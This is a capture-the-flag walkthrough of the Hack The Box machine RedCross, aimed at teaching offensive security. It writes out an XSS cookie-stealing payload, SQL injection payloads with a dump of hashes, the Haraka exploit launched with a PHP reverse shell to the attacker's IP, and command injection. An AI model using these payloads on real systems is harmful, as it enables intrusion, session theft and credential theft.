---
title: HTB: RedCross
url: https://0xdf.gitlab.io/2019/04/13/htb-redcross.html
date: 2019-04-13T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-redcross, hackthebox, ssh, nmap, wfuzz, linux, debian, php, cookies, gobuster, xss, sqli, sqlmap, command-injection, injection, postgresql, haraka, exploit-db, searchsploit, suid, sudo, sudoers, nss, jail, bof, exploit, python, pwntools, socat, rop, aslr, htb-frolic, htb-october
---

![RedCross-cover](https://0xdfimages.gitlab.io/img/redcross-cover.png)

RedCross was a maze, with a lot to look at and multiple paths at each stage. I’ll start by enumerating a website, and showing two different ways to get a cookie to use to gain access to the admin panel. Then, I’ll get a shell on the box as penelope, either via an exploit in the Haraka SMTP server or via injection in the webpage and the manipulation of the database that controls the users in the ssh jail. Finally, I’ll show escalation to root three different ways, using the database again in two different ways, and via a buffer overflow in a setuid binary. In Beyond Root, I’ll dig into the SQL injection and check out how the ssh jail is configured.

## Box Info

| Name | [RedCross](https://hackthebox.com/machines/redcross)  [RedCross](https://hackthebox.com/machines/redcross) [Play on HackTheBox](https://hackthebox.com/machines/redcross) |
| --- | --- |
| Release Date | [10 Nov 2018](https://twitter.com/hackthebox_eu/status/1060513493277908994) |
| Retire Date | 06 Apr 2019 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for RedCross |
| Radar Graph | Radar chart for RedCross |
| First Blood User | 03:07:45[braindamaged braindamaged](https://app.hackthebox.com/users/38653) |
| First Blood Root | 04:02:07[braindamaged braindamaged](https://app.hackthebox.com/users/38653) |
| Creator | [ompamo ompamo](https://app.hackthebox.com/users/9631) |

## Recon

### nmap

`nmap` shows ssh (22), http (80), and https (443):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-16 06:32 EST
Nmap scan report for 10.10.10.113
Host is up (0.020s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 13.45 second

root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.113

Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-16 06:33 EST
Nmap scan report for 10.10.10.113
Host is up (0.020s latency).
All 65535 scanned ports on 10.10.10.113 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds

root@kali# nmap -sV -oA nmap/versions 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-02 10:54 EDT
Nmap scan report for intra.redcross.htb (10.10.10.113)
Host is up (0.019s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.25
443/tcp open  ssl/http Apache httpd 2.4.25
Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.00 seconds

```

I’m not able to run my normal `nmap` run with scripts, as it just runs forever. There is some indication there’s a WAF blocking it. I can run just the `-sV` for version. Based on the [Apache version](https://packages.debian.org/search?keywords=apache2) and the [OpenSSH version](https://packages.debian.org/search?keywords=openssh-server), this is [Debian Stretch](https://wiki.debian.org/DebianStretch) (or Debian 9).

### intra.redcross.htb - TCP 443

#### Site

A GET to `http://10.10.10.113` returns a 301 redirect to `https://intra.redcross.htb`. Once I add the domain to my `hosts` file, and I’m on the https site, I’m redirected to `https://intra.redcross.htb/?page=login` and presented with a log in to RedCross Messaging Intranet:

![1554217462312](https://0xdfimages.gitlab.io/img/1554217462312.png)

Based on the url structure (`?page=login`), I’m guessing this might be a php site. I’ll try visiting `https://intra.redcross.htb/index.php?page=login` and confirm it’s the same.

#### gobuster

My initial `gobuster` turns up a couple pages and a few folders:

```

root@kali# gobuster -k -u https://intra.redcross.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://intra.redcross.htb/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2018/11/16 06:52:12 Starting gobuster
=====================================================
/index.php (Status: 302)
/images (Status: 301)
/pages (Status: 301)
/documentation (Status: 301)
/javascript (Status: 301)
/init.php (Status: 200)
=====================================================
2018/11/16 07:01:17 Finished
=====================================================

```

After not finding a ton more, I decided to look for document extensions in `/documentation`, and I found one:

```

root@kali# gobuster -k -u https://intra.redcross.htb/documentation -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,pdf -t 20

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://intra.redcross.htb/documentation/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,php,html,pdf
[+] Timeout      : 10s
=====================================================
2018/11/16 07:04:58 Starting gobuster
=====================================================
/account-signup.pdf (Status: 200)
=====================================================
2018/11/16 07:44:58 Finished
=====================================================

```

#### Contact Form

The pdf from `gobuster` gives me instructions on how to request access:

![1554218526494](https://0xdfimages.gitlab.io/img/1554218526494.png)

Visiting that url, I get a contact form:

![1554236429254](https://0xdfimages.gitlab.io/img/1554236429254.png)

I’ll be coming back this form, both to request an account and exploit an XSS vulnerability in it.

### admin.redcross.htb - TCP 443

#### wfuzz Subdomains

Any time I have a box pushing me to a hostname instead of just using the IP, I like to `wfuzz` for subdomains:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt -u https://10.10.10.113 -H "Host: FUZZ.redcross.htb" --hw 28 --hc 400

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                                                  
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: https://10.10.10.113/
Total requests: 19983

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000024:  C=302      0 L       18 W          363 Ch        "admin"
000373:  C=302      0 L       26 W          463 Ch        "intra"

Total time: 63.43666
Processed Requests: 19983
Filtered Requests: 19977
Requests/sec.: 315.0071

```

I already knew about `intra`, but `admin` is new.

#### Site

Another log in page, this time to the IT Admin panel:

![1554219549745](https://0xdfimages.gitlab.io/img/1554219549745.png)

## Exploitation Overview

This box has many different paths. I created a flow chart to attempt to show all the paths I found. The chart forms three main pinch points:
- Access to admin.redcross.htb
- Shell as penelope (or in penelope’s group)
- root shell

[![Exploitation Path](https://0xdfimages.gitlab.io/img/1554236597991.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1554236597991.png)

## Access to admin.redcross.htb

There are two (with a slight variation between charles and guest in the second) paths to this access:

![1554237770386](https://0xdfimages.gitlab.io/img/1554237770386.png)

### Path 1: XSS

I did not attack the XSS on my original solve, but in chatting with the machine author, he said this was the intended path to solve this part, as the other two ways I will show were not supposed to work.

In the contact form, at `https://intra.redcross.htb/?page=contact`, if I try to enter script tags into the subject or the body, I get an error:

![1554236901609](https://0xdfimages.gitlab.io/img/1554236901609.png)

That same check does not happen in the “Contact phone or email” text box. I’ll build a simple XSS payload:

`<script>new Image().src="http://10.10.14.14:8888/cookie.php?c="+document.cookie;</script>`

The script tries to create an image in the HTML with a source of my host that includes the user’s cookies. I’ll start a python web server and submit the tag:

![1554236998078](https://0xdfimages.gitlab.io/img/1554236998078.png)

In a few seconds, I get a hit on the webserver:

```

root@kali# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.113 - - [02/Apr/2019 16:29:42] code 404, message File not found
10.10.10.113 - - [02/Apr/2019 16:29:42] "GET /cookie.php?c=PHPSESSID=pqap288bkav9od4ga69g0r3os2;%20LANG=EN_US;%20SINCE=1554236439;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1" 404 -

```

Now I can take that `PHPSESSID` over to `admin.redcross.htb`, and use my Firefox cookie editing plugin to set the cookie:

![1554237125748](https://0xdfimages.gitlab.io/img/1554237125748.png)

Now I refresh the page, and I’m logged in as admin:

![1554237187933](https://0xdfimages.gitlab.io/img/1554237187933.png)

### Path 2: Cookie From Login

#### Create Account

Instead of exploiting the form, I’ll fill it out following the instructions to create an account:

![1554219622783](https://0xdfimages.gitlab.io/img/1554219622783.png)

I have firefox set up to [not redirect without permission](https://superuser.com/questions/874819/prevent-automatic-redirects-in-firefox). On hitting submit, the first page that loads is a redirect, but the body says:

![1554219664842](https://0xdfimages.gitlab.io/img/1554219664842.png)

On allowing the redirect, I’m back at the main login. And logging in with guest / guest works and drops me at a Account info page:

![1554219749998](https://0xdfimages.gitlab.io/img/1554219749998.png)

#### SQLi

On submitting the UserID filter, I’m sent to `https://intra.redcross.htb/?o=1&page=app`, where `o=` is the id filtered on. If I try with a `'` in there, `https://intra.redcross.htb/?o=1'&page=app`:

![1554221201416](https://0xdfimages.gitlab.io/img/1554221201416.png)

Just running `sqlmap` will grind to a halt and break because of the WAF on the box. I’ll look at [manual SQLi in Beyond Root](#sqli-details). But I can still use `sqlmap` if I put in `--delay=1`, which puts a one second delay between each request. That also makes this take forever. I’d recommend running it and walking away:

```

root@kali# sqlmap -r app.request --delay=1 --batch --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.10#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[*] starting at 17:35:40

[17:35:40] [INFO] parsing HTTP request from 'app.request'  
[17:35:40] [INFO] testing connection to the target URL           
sqlmap got a 301 redirect to 'https://intra.redcross.htb/?o=9&page=app'. Do you want to follow? [Y/n] Y
[17:35:41] [INFO] testing if the target URL content is stable
[17:35:42] [WARNING] GET parameter 'o' does not appear to be dynamic
[17:35:43] [INFO] heuristic (basic) test shows that GET parameter 'o' might be injectable (possible DBMS: 'MySQL')
[17:35:44] [INFO] heuristic (XSS) test shows that GET parameter 'o' might be vulnerable to cross-site scripting (XSS) attacks
[17:35:44] [INFO] testing for SQL injection on GET parameter 'o'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
...[snip]...
GET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 354 HTTP(s) requests:
---                                                                       
Parameter: o (GET)                                                           
    Type: boolean-based blind                                         
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: o=9') RLIKE (SELECT (CASE WHEN (1947=1947) THEN 9 ELSE 0x28 END))-- OmFQ&page=app
                                                                             
    Type: error-based                                                        
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: o=9') AND (SELECT 8387 FROM(SELECT COUNT(*),CONCAT(0x7176717671,(SELECT (ELT(8387=8387,1))),0x7170786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vfSo&page=app
                                                              
    Type: AND/OR time-based blind                         
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)      
    Payload: o=9') AND (SELECT * FROM (SELECT(SLEEP(5)))Uqaj)-- eNaD&page=app
---                                                             
[17:43:34] [INFO] the back-end DBMS is MySQL        
web server operating system: Linux Debian 9.0 (stretch)                     
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0                                             
...[snip]...                
Database: redcross                                      
Table: messages
[8 entries]
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+
| id | body                                                                                                                                                                                         | dest | origin | subject                                      |
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+
| 1  | You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.              | 5    | 1      | Guest Account Info                           |
| 2  | Hi Penny, can you check if is there any problem with the order? I'm not receiving it in our EDI platform.                                                                                    | 2    | 4      | Problems with order 02122128                 |
| 3  | Please could you check the admin webpanel? idk what happens but when I'm checking the messages, alerts popping everywhere!! Maybe a virus?                                                   | 3    | 1      | Strange behavior                             |
| 4  | Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.                                                                                                       | 4    | 2      | Problems with order 02122128                 |
| 5  | Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!                                           | 2    | 3      | admin subd webapp problems                   |
| 6  | Hi, Yes it's strange because we applied some input filtering on the contact form. Let me check it. I'll take care of that since now! KR                                                      | 3    | 2      | admin subd webapp problems (priority)        |
| 7  | Hi, Please stop checking messages from intra platform, it's possible that there is a vuln on your admin side...                                                                              | 1    | 2      | STOP checking messages from intra (priority) |
| 8  | Sorry but I can't do that. It's the only way we have to communicate with partners and we are overloaded. Doesn't look so bad... besides that what could happen? Don't worry but fix it ASAP. | 2    | 1      | STOP checking messages from intra (priority) |
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+
...[snip]...                           
Database: redcross                                                 
Table: users                   
[5 entries]                    
+----+------+------------------------------+----------+--------------------------------------------------------------+
| id | role | mail                         | username | password                                                     |
+----+------+------------------------------+----------+--------------------------------------------------------------+
| 1  | 0    | admin@redcross.htb           | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. |             
| 2  | 1    | penelope@redcross.htb        | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS |
| 3  | 1    | charles@redcross.htb         | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i |
| 4  | 100  | tricia.wanderloo@contoso.com | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. |
| 5  | 1000 | non@available                | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |
+----+------+------------------------------+----------+--------------------------------------------------------------+

[17:45:53] [INFO] table 'redcross.users' dumped to CSV file '/root/.sqlmap/output/intra.redcross.htb/dump/redcross/users.csv'
[17:45:53] [INFO] fetched data logged to text files under '/root/.sqlmap/output/intra.redcross.htb'   

[*] shutting down at 17:45:53

```

Over 10 minutes, I got two interesting things:
- A set of usernames and hashes.
- A bunch of messages, including references to the admin panel (if I hadn’t looked for subdomains yet, a queue to do so) and references to interaction between intra and admin.

#### Crack Passwords

These passwords are bcrypt, and would take several days to brute all of rockyou on my computer. However, one cracks really quickly:

```

$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --force
hashcat (v4.0.1) starting...
...[snip]...
$ cat cracked 
$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i:cookiemonster
$ grep -F 'y$10$bj5Qh0AbU' hashes 
charles:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i

```

The charles account has the password “cookiemonster”.

#### Access to admin

I can log into `intra` now as charles, and see more messages (nothing new from what I saw in the sqli):

![1554222384836](https://0xdfimages.gitlab.io/img/1554222384836.png)

I’ll try those same creds on `admin.redcross.htb`:

![1554221051340](https://0xdfimages.gitlab.io/img/1554221051340.png)

And then redirects me to the login page. In fact, if I log in to `admin.redcross.htb` as guest/guest, it returns the same.

However, if I take the cookie of guest or charles intra and set it as the `PHPSESSID` for admin, it works. I’ll go to the `intra` site logged in as charles and open my “Cookie Editor” Firefox plugin:

![1554222576171](https://0xdfimages.gitlab.io/img/1554222576171.png)

I’ll grab that cookie value, and then switch over to `admin`, where I can paste in the copies PHPSESSID and hit save. On refresh, I’m logged in as charles:

![1554222642287](https://0xdfimages.gitlab.io/img/1554222642287.png)

The same technique works with the guest cookie, meaning I could have skipped the SQLi all together.

## Shell as Penelope

### Overview

From this point, there are two paths to a penelope shell, with a few optional steps in the second:

![1554237849831](https://0xdfimages.gitlab.io/img/1554237849831.png)

### Open Firewall

Both paths start using the access to `admin.redcross.htb` to open up more ports in the firewall.

At the main page, I’ll hit “Network Access”:

![1554224533998](https://0xdfimages.gitlab.io/img/1554224533998.png)

If I enter my IP and click the button, I’m first taken to:

![1554224575557](https://0xdfimages.gitlab.io/img/1554224575557.png)

And then redirected back to the page:

![1554224592269](https://0xdfimages.gitlab.io/img/1554224592269.png)

If I re-run `nmap` now, I see a couple new ports, ftp (21), something on 1025, and Postgres on 5432:

```

root@kali# nmap -p- --min-rate 5000 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-02 12:33 EDT
Nmap scan report for intra.redcross.htb (10.10.10.113)
Host is up (0.021s latency).       
Not shown: 65529 closed ports                
PORT     STATE SERVICE                                       
21/tcp   open  ftp                                   
22/tcp   open  ssh                                         
80/tcp   open  http     
443/tcp  open  https         
1025/tcp open  NFS-or-IIS          
5432/tcp open  postgresql
                                                 
Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds

```

### Path 1: Haraka

#### Enumeration

I’ll notice when I got increased network access, port 1025 was now listening. `nmap` didn’t identify it, but a patient `nc` connection will:

```

root@kali# nc 10.10.10.113 1025
220 redcross ESMTP Haraka 2.8.8 ready
421 timeout  

```

#### Exploit

There’s an exploit for this version of Haraka:

```

root@kali# searchsploit haraka
------------------------------------------- ----------------------------------------
 Exploit Title                             |  Path
                                           | (/usr/share/exploitdb/)
------------------------------------------- ----------------------------------------
Haraka < 2.8.9 - Remote Command Execution  | exploits/linux/remote/41162.py
------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

I used this script without modification. First, I got the target to ping me:

```

[HARAKIRI SUCCESS] SMTPDataError is most likely an error unzipping the archive, which is what we want [Error unpacking archive]                                                                                            
root@kali# python 41162.py -c "ping -c 1 10.10.14.14" -t penelope@redcross.htb -m 10.10.10.113                                                                                          
##     ##    ###    ########     ###    ##    ## #### ########  ####
##     ##   ## ##   ##     ##   ## ##   ##   ##   ##  ##     ##  ##
##     ##  ##   ##  ##     ##  ##   ##  ##  ##    ##  ##     ##  ##
######### ##     ## ########  ##     ## #####     ##  ########   ##
##     ## ######### ##   ##   ######### ##  ##    ##  ##   ##    ##
##     ## ##     ## ##    ##  ##     ## ##   ##   ##  ##    ##   ##
##     ## ##     ## ##     ## ##     ## ##    ## #### ##     ## ####
-o- by Xychix, 26 January 2017 ---
-o- xychix [at] hotmail.com ---
-o- exploit haraka node.js mailserver <= 2.8.8 (with attachment plugin activated) --
-i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)

Send harariki to penelope@redcross.htb, attachment saved as harakiri-20190403-125438.zip, commandline: ping -c 1 10.10.14.14 , mailserver 10.10.10.113 is used for delivery
...[snip]...

```

After a about one minute, I got a ping back:

```

root@kali# tcpdump -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
12:55:36.153998 IP 10.10.10.113 > 10.10.14.14: ICMP echo request, id 13394, seq 1, length 64
12:55:36.154033 IP 10.10.14.14 > 10.10.10.113: ICMP echo reply, id 13394, seq 1, length 64

```

I had a hard time with a lot of common reverse shells, but I got the php one to work. It’s important to escape the inner `"` and `$`:

```

root@kali# python 41162.py -c "php -r '\$sock=fsockopen(\"10.10.14.14\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -t penelope@redcross.htb -m 10.10.10.113                              
##     ##    ###    ########     ###    ##    ## #### ########  ####
##     ##   ## ##   ##     ##   ## ##   ##   ##   ##  ##     ##  ##
##     ##  ##   ##  ##     ##  ##   ##  ##  ##    ##  ##     ##  ##
######### ##     ## ########  ##     ## #####     ##  ########   ##
##     ## ######### ##   ##   ######### ##  ##    ##  ##   ##    ##
##     ## ##     ## ##    ##  ##     ## ##   ##   ##  ##    ##   ##
##     ## ##     ## ##     ## ##     ## ##    ## #### ##     ## ####
-o- by Xychix, 26 January 2017 ---
-o- xychix [at] hotmail.com ---
-o- exploit haraka node.js mailserver <= 2.8.8 (with attachment plugin activated) --
-i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)

Send harariki to penelope@redcross.htb, attachment saved as harakiri-20190403-125710.zip, commandline: php -r '$sock=fsockopen("10.10.14.14",443);exec("/bin/sh -i <&3 >&3 2>&3");' , mailserver 10.10.10.113 is used for delivery

```

And after a minute:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.113.
Ncat: Connection from 10.10.10.113:35862.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(penelope) gid=1000(penelope) groups=1000(penelope)

```

#### Metasploit

Alternatively, there is a metasploit module that also worked. Here’s my configuration:

```

msf5 exploit(linux/smtp/haraka) > options

Module options (exploit/linux/smtp/haraka):

   Name        Current Setting        Required  Description
   ----        ---------------        --------  -----------
   SRVHOST     0.0.0.0                yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0                                                                                       
   SRVPORT     8008                   yes       The local port to listen on.
   SSL         false                  no        Negotiate SSL for incoming connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)                                                                                                           
   URIPATH                            no        The URI to use for this exploit (default is random)
   email_from  0xdf@redcross.htb      yes       Address to send from
   email_to    penelope@redcross.htb  yes       Email to send to, must be accepted by the server
   rhost       10.10.10.113           yes       Target server
   rport       1025                   yes       Target server port

Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   linux x64

```

Now run it to get a shell as actual penelope:

```

msf5 exploit(linux/smtp/haraka) > run

[*] Started reverse TCP handler on 10.10.14.14:443
[*] Exploiting...
[*] Using URL: http://0.0.0.0:8008/PxA0ZIx
[*] Local IP: http://10.1.1.41:8008/PxA0ZIx
[*] Sending mail to target server...
[*] Client 10.10.10.113 (Wget/1.18 (linux-gnu)) requested /PxA0ZIx
[*] Sending payload to 10.10.10.113 (Wget/1.18 (linux-gnu))
[*] Command shell session 1 opened (10.10.14.14:443 -> 10.10.10.113:47192) at 2019-04-02 14:35:27 -0400
[+] Triggered bug in target server (plugin timeout)
[*] Command Stager progress - 100.00% done (111/111 bytes)
[*] Server stopped.
id
uid=1000(penelope) gid=1000(penelope) groups=1000(penelope)

```

### Path 2.1: Shell As www-data

#### Allow Network and Add User

Having already opened up the firewall above, now I’ll click the other link, User Management:

![1554224440808](https://0xdfimages.gitlab.io/img/1554224440808.png)

If I enter “0xdf” and hit “adduser”, I’m taken to a page with a password:

![1554224465587](https://0xdfimages.gitlab.io/img/1554224465587.png)

And hitting “Continue” takes me back to the page where my user now is:

![1554224490178](https://0xdfimages.gitlab.io/img/1554224490178.png)

#### Find iptctl.c

I can now connect to the box via ftp or ssh with my new account. FTP is rooted out of the `/home` directory I can see from ssh. Since it’s just a subset, I’ll focus on ssh.

The ssh access is strange. I knew from the time it let me create a username that started with a digit that it wasn’t going to be a normal box account.

```

$ id
uid=2021 gid=1001(associates) groups=1001(associates)
$ whoami
whoami: cannot find name for user ID 2021
$ cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash
penelope:x:1000:1000:Penelope,,,:/home/penelope:/bin/bash
$ ps aux
-bash: ps: command not found

```

Clearly I’m in some kind of jail. I’ll come back to that later.

For now, the only interesting thing I can find is in `/home/public/src/iptctl.c`:

```

/*
 * Small utility to manage iptables, easily executable from admin.redcross.htb
 * v0.1 - allow and restrict mode
 * v0.3 - added check method and interactive mode (still testing!)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#define BUFFSIZE 360

int isValidIpAddress(char *ipAddress)
{
        struct sockaddr_in sa;
        int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
        return result != 0;
}

int isValidAction(char *action){
        int a=0;
        char value[10];
        strncpy(value,action,9);
        if(strstr(value,"allow")) a=1;
        if(strstr(value,"restrict")) a=2;
        if(strstr(value,"show")) a=3;
        return a;
}

void cmdAR(char **a, char *action, char *ip){
        a[0]="/sbin/iptables";
        a[1]=action;
        a[2]="INPUT";
        a[3]="-p";
        a[4]="all";
        a[5]="-s";
        a[6]=ip;
        a[7]="-j";
        a[8]="ACCEPT";
        a[9]=NULL;
        return;
}

void cmdShow(char **a){
        a[0]="/sbin/iptables" ;
        a[1]="-L";
        a[2]="INPUT";
        return;
}

void interactive(char *ip, char *action, char *name){
        char inputAddress[16];
        char inputAction[10];
        printf("Entering interactive mode\n");
        printf("Action(allow|restrict|show): ");
        fgets(inputAction,BUFFSIZE,stdin);
        fflush(stdin);
        printf("IP address: ");
        fgets(inputAddress,BUFFSIZE,stdin);
        fflush(stdin);
        inputAddress[strlen(inputAddress)-1] = 0;
        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
                printf("Usage: %s allow|restrict|show IP\n", name);
                exit(0);
        }
        strcpy(ip, inputAddress);
        strcpy(action, inputAction);
        return;
}

int main(int argc, char *argv[]){
        int isAction=0;
        int isIPAddr=0;
        pid_t child_pid;
        char inputAction[10];
        char inputAddress[16];
        char *args[10];
        char buffer[200];

        if(argc!=3 && argc!=2){
                printf("Usage: %s allow|restrict|show IP_ADDR\n", argv[0]);
                exit(0);
        }
        if(argc==2){
                if(strstr(argv[1],"-i")) interactive(inputAddress, inputAction, argv[0]);
        }
        else{
                strcpy(inputAction, argv[1]);
                strcpy(inputAddress, argv[2]);
        }
        isAction=isValidAction(inputAction);
        isIPAddr=isValidIpAddress(inputAddress);
        if(!isAction || !isIPAddr){
                printf("Usage: %s allow|restrict|show IP\n", argv[0]);
                exit(0);
        }
        puts("DEBUG: All checks passed... Executing iptables");
        if(isAction==1) cmdAR(args,"-A",inputAddress);
        if(isAction==2) cmdAR(args,"-D",inputAddress);
        if(isAction==3) cmdShow(args);

        child_pid=fork();
        if(child_pid==0){
                setuid(0);
                execvp(args[0],args);
                exit(0);
        }
        else{
                if(isAction==1) printf("Network access granted to %s\n",inputAddress);
                if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
                if(isAction==3) puts("ERR: Function not available!\n");
        }
}

```

#### Injection RCE

I can see the comment “easily executable from admin.redcross.htb”, and two strings I saw on the webpage when I added my IP to the firewall: “DEBUG: All checks passed… Executing iptables” and “Network access granted to %s\n”. It seems that this c program is being called when I hit submit on that page. I see some potential vulnerabilities in the interactive mode section, but I don’t think the webpage would allow me to get to that area of code. If I think about how the php code is calling this, I wonder if I can do injection at that point. I could even have tested that HTTP post for injection without access to this source code, and skipped most of this path up until now.

I’ll find my previous POST request from when I added my IP in Burp (or create a new one) and send it to repeater. I’ll add a simple check to ping myself, start `tcpdump`, and then send it. Unfortunately, I get an error:

![1554226551246](https://0xdfimages.gitlab.io/img/1554226551246.png)

However, if I try the deny action, I get better results:

![1554226592366](https://0xdfimages.gitlab.io/img/1554226592366.png)

And I see it at `tcpdump`:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
13:35:48.819332 IP intra.redcross.htb > kali: ICMP echo request, id 16518, seq 1, length 64
13:35:48.819376 IP kali > intra.redcross.htb: ICMP echo reply, id 16518, seq 1, length 64

```

Since I can see output, I can run other commands:

![1554226655779](https://0xdfimages.gitlab.io/img/1554226655779.png)

And I can get a shell using a `php` rev shell:

![1554229271639](https://0xdfimages.gitlab.io/img/1554229271639.png)

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.113.
Ncat: Connection from 10.10.10.113:46998.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I can see `user.txt` in penelope’s homedir, but I can’t access it:

```

www-data@redcross:/home/penelope$ cat user.txt 
cat: user.txt: Permission denied

```

### Path 2.2: Shell As “penelope”

#### Find postgresql Creds

I know that the website can create and manage users for the jail. Looking at the files in the admin dir, `actions.php` jumps out:

```

www-data@redcross:/var/www/html/admin/pages$ ls
actions.php  bottom.php  cpanel.php  firewall.php  header.php  login.php  users.php

```

I’m particularly interested in the code that adds users:

```

...[snip]...
if($action==='adduser'){                                                                                   
        $username=$_POST['username'];                                             
        $passw=generateRandomString();                       
        $phash=crypt($passw);                   
        $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
        $result = pg_prepare($dbconn, "q1", "insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')");                                                                          
        $result = pg_execute($dbconn, "q1", array($username, $phash));
        echo "Provide this credentials to the user:<br><br>";
        echo "<b>$username : $passw</b><br><br><a href=/?page=users>Continue</a>";
}    
...[snip]...

```

That code contains the username and password of a postgres user that can add users to this system. That will be useful.

